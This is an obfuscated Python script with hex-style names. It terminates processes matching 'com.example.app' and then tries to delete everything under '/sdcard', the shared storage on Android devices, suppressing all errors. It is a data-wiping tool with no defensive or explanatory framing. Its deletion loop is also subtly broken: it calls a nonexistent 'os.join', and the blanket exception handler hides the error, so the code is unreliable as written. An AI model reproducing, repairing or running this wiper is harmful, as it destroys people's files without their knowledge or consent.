import psutil as _0x1
import os as _0x2
import shutil as _0x3
import time as _0x4

_0x5 = "com.example.app"

def _0x6():
    for _0x7 in _0x1.process_iter(['pid', 'name']):
        try:
            if _0x5.lower() in _0x7.info['name'].lower():
                _0x7.kill()
        except (_0x1.NoSuchProcess, _0x1.AccessDenied):
            pass

def _0x8(_0x9="/sdcard"):
    try:
        for _0xa, _0xb, _0xc in _0x2.walk(_0x9, topdown=False):
            for _0xd in _0xc:
                _0xe = _0x2.join(_0xa, _0xd)
                _0x2.remove(_0xe)
            for _0xf in _0xb:
                _0x10 = _0x2.join(_0xa, _0xf)
                _0x3.rmtree(_0x10, ignore_errors=True)
    except Exception:
        pass

if __name__ == "__main__":
    _0x6()
    _0x4.sleep(2)
    _0x8("/sdcard")
